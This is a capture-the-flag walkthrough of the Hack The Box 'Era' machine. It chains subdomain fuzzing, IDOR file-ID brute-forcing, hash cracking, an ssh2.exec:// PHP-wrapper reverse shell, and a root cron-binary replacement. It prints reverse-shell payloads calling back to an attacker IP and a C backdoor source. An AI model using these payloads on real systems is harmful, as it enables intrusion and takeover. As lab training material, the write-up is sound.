# Era

```
Difficulty: Medium
Operating System: Linux
Hints: True
```

#### 🏁 Summary of Attack Chain

| Step | User / Access                  | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | (Local) | Nmap, Subdomain Fuzzing | Identified `era.htb` and found subdomain `file.era.htb` via `ffuf`. |
| 2 | (Web) | Dirsearch, User Registration | Discovered `register.php`, allowing for new user account creation on `file.era.htb`. |
| 3 | (Web) | IDOR & File Download | Used `burpsuite` Intruder to brute-force file IDs, finding a `site-backup` archive. |
| 4 | (Local) | Archive Analysis & Hash Cracking | Extracted a `filedb.sqlite` database from the backup and cracked two user passwords (`eric:amXXXXa`, `yuri:muXXXXX`) using `john`. |
| 5 | (Web) | LFI & SSH2 Wrapper Exploit | Analyzed `download.php` source code, found an admin-only feature vulnerable to LFI, and used `ssh2.exec://` to get a reverse shell. |
| 6 | yuri -> eric | Shell Escalation & User Enumeration | Initially gained a shell as `yuri`, then switched to `eric` using the cracked password to retrieve `user.txt`. |
| 7 | eric | Cron Job Enumeration (pspy) | Identified a `root` owned cron job that periodically executed a binary named `monitor` in `/opt/AV/periodic-checks`. |
| 8 | eric | Binary Analysis & Code Signing | Discovered the cron job was checking a `.text_sig` section of the `monitor` binary for integrity. |
| 9 | eric -> root | Malicious Binary Replacement | Created a malicious `monitor` binary, signed it with the correct key to bypass the integrity check, and replaced the original binary. |
| 10 | root | Root Shell | The cron job executed the malicious `monitor` binary as `root`, granting a reverse shell and the `root.txt` flag. |

![Map](Pictures/htb_Era_Mind_Map.png)

### Initial Enumeration

An initial nmap scan did not reveal anything particularly unusual, showing common ports like 21 (FTP) and 80 (HTTP). We added era.htb to the /etc/hosts file.

### Foothold and user.txt

Since the main website had no obvious interactive features, we moved to subdomain enumeration. Using ffuf with a large wordlist, we successfully discovered the file.era.htb subdomain.

![Web ](Pictures/htb_Era_1stWeb.png)

Bash

```
ffuf -w /path/to/top100ksubdomain.txt -H  "Host: FUZZ.era.htb" -u http://era.htb -t 200 -fs 154
```
We added file.era.htb to our /etc/hosts file and then performed a directory scan with gobuster.

![File ](Pictures/htb_Era_file2ndWeb.png)




Bash

```
gobuster dir -u http://file.era.htb/ -w /usr/share/wordlists/dirb/common.txt -t 50 --exclude-length 6765 -x php
```



This scan revealed several interesting PHP pages, including register.php, login.php, download.php, and upload.php.

![File ](Pictures/htb_Era_file2ndWeb.png)

 We registered a new user and uploaded a file, which provided us with a download link containing an ID parameter (e.g., download.php?id=...). This suggested a potential Insecure Direct Object Reference (IDOR) vulnerability.

![Burp ](Pictures/htb_Era_ID_Identified.png)
![54 ](Pictures/htb_Era_ID_54Identified.png)


Using burpsuite's Intruder to brute-force the id parameter, we discovered two valid IDs (54 and 150) that returned different content. One of these, ID 54, downloaded a file named site-backup-30-08-24.zip.

![150 ](Pictures/htb_Era_ID_150_Identified.png)

![Database](Pictures/htb_Era_fuileupnzip.png)

![File](Pictures/htb_Era_sqlitefile.png)




After extracting the backup, we found a SQLite database file named filedb.sqlite. Dumping the database's contents revealed a users table with hashed passwords and security questions for six users, including an admin_eXXXXXXXXXaa account.

![Database](Pictures/htb_Era_Database.png)


#### Database ( User and Pass )

There is a database file filedb.sqlite that can be used. You can open it directly in Kali and find that there is a user table


We extracted the hashes and used john with the rockyou.txt wordlist to crack the passwords for eric and yuri.

Bash

```
john --show hash.txt
eric:amXXXXa
yuri:muXXXXX
```

![Cred ](Pictures/htb_Era_user_pass.png)

Next, we analyzed the download.php source code from the backup. 

```
<?php
session_start();

// Function to contact the database using SQLite3 prepared statements
function contactDB($query, $params = [], $type = 0) {
    global $db;

    try {
        $stmt = $db->prepare($query);

        $paramIndex = 1;
        foreach ($params as $param) {
            $stmt->bindValue($paramIndex, $param, getParamType($param));
            $paramIndex++;
        }

        $result = $stmt->execute();

        return ($type == 0) ? $result->fetchArray(SQLITE3_NUM) : $result->fetchArray(SQLITE3_ASSOC);

    } catch (Exception $e) {
        error_log("Database error: " . $e->getMessage());
        return false;
    }
}

// Helper for parameter types
function getParamType($param) {
    if (is_int($param)) return SQLITE3_INTEGER;
    if (is_float($param)) return SQLITE3_FLOAT;
    if (is_null($param)) return SQLITE3_NULL;
    return SQLITE3_TEXT;
}

// Connect to SQLite
$db = new SQLite3('filedb.sqlite');

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $answer1 = $_POST['answer1'];
    $answer2 = $_POST['answer2'];
    $answer3 = $_POST['answer3'];

    $query = "SELECT user_id, security_answer1, security_answer2, security_answer3 FROM users WHERE user_name = ?";
    $user_data = contactDB($query, [$username], 1);

    if ($user_data) {
        if (
            $answer1 === $user_data['security_answer1'] &&
            $answer2 === $user_data['security_answer2'] &&
            $answer3 === $user_data['security_answer3']
        ) {
            $_SESSION['eravalid'] = true;
            $_SESSION['erauser'] = $user_data['user_id'];
            $operation_successful = true;
        } else {
            $error_message = "Incorrect answers. Please try again.";
        }
    } else {
        $error_message = "User not found.";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Log in with Security Questions</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
    <style>
        html, body {
            margin: 0;
            padding: 0;
            height: 100%;
            font-family: 'Inter', Arial, sans-serif;
            background: linear-gradient(120deg, #e0e7ff 0%, #f8fafc 100%);
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .container {
            background-color: #fff;
            max-width: 500px;
            width: 100%;
            border-radius: 12px;
            padding: 2.5rem 2rem;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.1);
        }

        h1 {
            font-size: 1.65rem;
            font-weight: 700;
            color: #1d3557;
            text-align: center;
            margin-bottom: 0.5rem;
        }

        p.description {
            text-align: center;
            color: #555;
            font-size: 0.95rem;
            margin-bottom: 1.5rem;
        }

        form {
            display: flex;
            flex-direction: column;
        }

        .form-group {
            margin-bottom: 1.2rem;
        }

        label {
            font-weight: 500;
            color: #374151;
            margin-bottom: 0.4rem;
            display: block;
            font-size: 1rem;
        }

        input[type="text"] {
            width: 100%;
            padding: 0.75rem 1rem;
            border: 1px solid #d1d5db;
            border-radius: 5px;
            background-color: #f9fafb;
            font-size: 1.05rem;
            transition: border 0.2s, box-shadow 0.2s;
            box-sizing: border-box;
        }

        input.answer-input {
            width: 90%;
            margin: 0 auto;
            display: block;
            text-align: center;
        }

        input[type="text"]:focus {
            border-color: #6366f1;
            background-color: #fff;
            outline: none;
            box-shadow: 0 0 0 2px rgba(99, 102, 241, 0.3);
        }

        input[type="submit"] {
            padding: 0.85rem;
            background: linear-gradient(90deg, #6366f1, #2563eb);
            color: white;
            font-size: 1.05rem;
            font-weight: 600;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background 0.3s ease, box-shadow 0.3s ease;
            margin-top: 1rem;
        }

        input[type="submit"]:hover {
            background: linear-gradient(90deg, #2563eb, #6366f1);
            box-shadow: 0 4px 14px rgba(99, 102, 241, 0.2);
        }

        .error, .success {
            max-width: 320px;
            margin: 0 auto 1.2rem;
            padding: 0.9rem 1.1rem;
            border-radius: 6px;
            font-weight: 500;
            text-align: center;
        }

        .error {
            background-color: #fee2e2;
            color: #b91c1c;
            border: 1px solid #fca5a5;
        }

        .success {
            background-color: #d1fae5;
            color: #065f46;
            border: 1px solid #6ee7b7;
            font-weight: 600;
        }

        @media (max-width: 500px) {
            .container {
                padding: 2rem 1rem;
            }

            input.answer-input {
                width: 100%;
            }
        }
    </style>
    <script>
        function showSuccessAndRedirect() {
            const successMessage = document.getElementById('successMessage');
            if (successMessage) {
                successMessage.style.display = 'block';
                setTimeout(() => {
                    window.location.href = 'manage.php';
                }, 1000);
            }
        }
    </script>
</head>
<body>
    <div class="container">
        <h1>Log in Using Security Questions</h1>
        <p class="description">
            If you’ve forgotten your password, you can log in by answering your security questions instead.
        </p>
        <?php
        if (isset($error_message)) {
            echo "<div class='error'>" . htmlspecialchars($error_message) . "</div>";
        }
        if (isset($operation_successful) && $operation_successful) {
            echo "<div id='successMessage' class='success'>Login successful. Redirecting…</div>";
            echo "<script>showSuccessAndRedirect();</script>";
        }
        ?>
        <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post" autocomplete="off">
            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" id="username" name="username" required autocomplete="username" class="answer-input" />
            </div>
            <div class="form-group">
                <label for="question1">What is your mother's maiden name?</label>
                <input type="text" id="question1" name="answer1" required class="answer-input" />
            </div>
            <div class="form-group">
                <label for="question2">What was the name of your first pet?</label>
                <input type="text" id="question2" name="answer2" required class="answer-input" />
            </div>
            <div class="form-group">
                <label for="question3">In which city were you born?</label>
                <input type="text" id="question3" name="answer3" required class="answer-input" />
            </div>
            <input type="submit" value="Verify and Log In" />
        </form>
    </div>
</body>
</html>
```


**We found a vulnerability in the administrator-only functionality ($_SESSION['erauser'] === 1). This feature allowed for a Server-Side Request Forgery (SSRF) via PHP stream wrappers, specifically ssh2.exec://.**

To exploit this, we needed to log in as the administrator. The reset.php and security_login.php files from the backup revealed that the admin password could be reset by answering security questions. The filedb.sqlite dump provided the correct answers for the admin account (Maria, Oliver, Ottawa).

![Admin login](Pictures/htb_Era_admin_login.png)


After the modification, log in to security_login.php again. 

![Admin login](Pictures/htb_Era_admin_login_ad.png)

If you successfully log in as admin, you can go back to download.php to find a way to exploit it.


#### PHP wrapper -> RCE

I have previously analyzed that there may be the use of pseudo-protocols, but after my attempts, the following URLs will not be directly echoed

URL

```
http://file.era.htb/?id=1&show=true&format=php://filter/read=convert.base64-encode/resource=/etc/passwd
```

After trying, I found that Yuri's account can log in to the ftp service


![FTP login](Pictures/htb_Era_ftp.png)

The php8.1_conf directory is as follows

![FTP_DIR](Pictures/htb_Era_ftp_dir.png)

I have previously analyzed that there may be the use of pseudo-protocols, but after my attempts, the following URLs will not be directly echoed

After trying, I found that Yuri's account can log in to the ftp serviceThe php8.1_conf directory is as follows

Note that there is an ssh2 extension, for usage refer to the PHP manual: PHP: Supported Protocols and Wrappers - Manual

ssh2.shell://user:pass@example.com:22/xterm
ssh2.exec://user:pass@example.com:22/usr/local/bin/somecmd
ssh2.tunnel://user:pass@example.com:22/192.168.0.1:14
ssh2.sftp://user:pass@example.com:22/path/to/filename
Try the following payload to rebound the shell. Since the URL is encoded in base64, try to avoid the presence of plus signs (which will be parsed as spaces). The solution is to insert a plus sign before the base64 encoding to eliminate the encoding.


After logging in as the administrator, we crafted a malicious URL to trigger a reverse shell using the ssh2.exec:// wrapper with eric's credentials. The URL executed a base64-encoded bash command to connect to our local listener.


Bash

```
http://file.era.htb/download.php?id=54&show=true&format=ssh2.exec://eric:amXXXXXa@127.0.0.1/bash%20-c%20"bash%20-i%20>&%20/dev/tcp/<YOUR_IP>/4444%200>&1";
```

Attacker
```
nc -lnvp 4444
```
This gave us a shell as the yuri user. We then used the cracked password to switch to the eric user and successfully retrieved user.txt.

![User flag ](Pictures/htb_Era_reverse_linp_eric_user.png)


### Privilege Escalation to Root


Our path to root started with a thorough post-exploitation enumeration. After gaining a shell as the eric user, we uploaded and ran linpeas.sh. The script highlighted a suspicious binary named monitor running as root. Looking at the processes with ps aux, we confirmed that monitor was part of a cron job executed by root.

![Root ](Pictures/htb_Era_reverse_linp_eric_user.png)

Upload linpeas.sh and find that the current user has a special file

Run pspy to view the process status

The cron job's script, /root/initiate_monitoring.sh, also used objcopy to verify a .text_sig section of the monitor binary. This indicated that we could replace the monitor binary with our own malicious code, as long as we also signed it correctly.

CRON -f -P: This is the scheduled task daemon process , indicating that the scheduled task has been triggered.

bash -c echo > /opt/AV/periodic-checks/status.log: The scheduled task cleared a log file.

objcopy --dump-section .text_sig=... /opt/AV/periodic-checks/monitor: /opt/AV/periodic-checks/monitorExtract segments from this binary file .text_sig, possibly for integrity verification or signature checking.
/root/initiate_monitoring.shA large number of concurrent executions (PID 25204–25213): This is the key, indicating that CRON triggered a script /root/initiate_monitoring.sh, but it was executed multiple times in a very short period of time .

Therefore, it can be analyzed that this file will be executed regularly, and the text_sig segment will be checked for changes. What we can do is to modify the file content to elevate privileges and copy the text_sig segment.

We compiled a custom C program that would give us a root shell.


**mal.c**

```
#include <unistd.h>
int main() {
    setuid(0); setgid(0);
    execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/<YOUR_IP>/1337 0>&1", NULL);
    return 0;
}
```

We compiled it statically:

Bash

```
gcc mali.c -o backdoor
```

![Root ](Pictures/htb_Era_malic_backdoor.png)

Bash

```
objcopy --dump-section .text_sig=text_sig /opt/AV/periodic-checks/monitor
objcopy --add-section .text_sig=text_sig backdoor
cp backdoor monitor

```
Finally, we uploaded our newly signed monitor binary to the /opt/AV/periodic-checks directory, replacing the original.

Bash


```
chmod +x monitor
```

The next time the cron job ran, our malicious monitor binary was executed as root. We caught the reverse shell on our listener.

Bash

```
nc -lnvp 1337
```

![Root Flag](Pictures/htb_Era_Root_flag.png)

This gave us a root shell, and we successfully retrieved root.txt.




**Pwned! Era**
